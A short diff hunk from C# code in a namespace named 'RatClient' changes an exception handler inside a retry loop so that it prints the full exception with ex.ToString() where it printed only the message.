@@ -126,7 +126,7 @@ namespace RatClient
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.Message);
+                    Console.WriteLine(ex.ToString());
                     Resetor();
                 }
                 Thread.Sleep(1000);
